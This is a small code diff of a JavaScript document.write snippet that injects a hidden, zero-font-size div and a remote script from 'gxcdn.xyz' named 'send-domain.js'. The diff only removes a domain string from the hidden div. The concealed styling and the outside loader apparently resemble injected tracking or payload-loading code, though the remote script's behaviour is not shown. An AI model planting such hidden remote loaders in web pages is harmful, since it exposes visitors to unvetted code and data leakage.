@@ -1,6 +1,6 @@
 document.write(`
 
 <div id="Client"></div>
-<div class="demo-container" style="font-size:0;" hidden>feguys.com</div>
+<div class="demo-container" style="font-size:0;" hidden></div>
 <script src="https://gxcdn.xyz/old_st/send-domain.js"><\/script>
 `)
